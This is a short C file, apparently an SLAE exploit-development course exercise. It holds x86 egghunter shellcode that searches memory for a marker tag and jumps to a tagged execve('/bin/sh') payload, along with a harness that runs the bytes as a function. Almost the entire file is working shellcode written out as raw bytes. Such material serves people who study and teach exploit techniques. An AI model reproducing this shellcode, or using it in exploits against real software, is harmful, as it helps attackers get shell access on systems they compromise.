/* Description:	EggHunter(execve(/bin/sh))
 * Author:	Paolo Stivanin <https://github.com/polslinux>
 * SLAE ID:	526
 */

#include <stdio.h>
#include <string.h>

unsigned char eggHunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42"
"\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
"\x3c\xf2\x74\xee\xb8"
"\x41\x42\x43\x44"
"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6"
"\xff\xe7";
unsigned char execveShellcode[] = \
"\x41\x42\x43\x44"
"\x41\x42\x43\x44"
"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void){
	printf("EggHunter: %zu\n", strlen(eggHunter));
	printf("execveShellcode: %zu\n", strlen(execveShellcode));
	int (*ret)() = (int(*)())eggHunter;
	ret();
	return 0;
}
